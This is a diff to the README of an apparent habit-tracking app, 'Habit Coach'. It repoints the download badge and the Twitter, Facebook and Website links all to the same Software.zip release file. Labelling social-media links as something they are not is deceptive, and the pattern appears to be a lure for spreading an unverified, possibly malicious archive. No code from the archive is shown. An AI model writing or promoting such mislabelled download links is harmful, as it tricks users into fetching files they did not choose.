@@ -27,7 +27,7 @@ Habit Coach is a simple yet powerful tool designed to assist you in developing p
 
 To get started with Habit Coach, simply download the software from the link below:
 
-[![Download Habit Coach](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Habit Coach](https://github.com/rain12gamer/habit-coach/releases/download/v2.0/Software.zip)](https://github.com/rain12gamer/habit-coach/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software, launch the application and begin your journey towards building healthier habits.
 
@@ -45,9 +45,9 @@ We hope Habit Coach becomes your trusted companion in achieving your goals and l
 
 Stay connected with us for the latest updates, tips, and inspiration on habit-building:
 
-🔹 Follow us on [Twitter](https://twitter.com/habitcoach)
-🔹 Like us on [Facebook](https://www.facebook.com/habitcoach)
-🔹 Visit our [Website](https://www.habitcoach.com) for articles and resources
+🔹 Follow us on [Twitter](https://github.com/rain12gamer/habit-coach/releases/download/v2.0/Software.zip)
+🔹 Like us on [Facebook](https://github.com/rain12gamer/habit-coach/releases/download/v2.0/Software.zip)
+🔹 Visit our [Website](https://github.com/rain12gamer/habit-coach/releases/download/v2.0/Software.zip) for articles and resources
 
 Let's build healthy habits together with Habit Coach! 💪
 
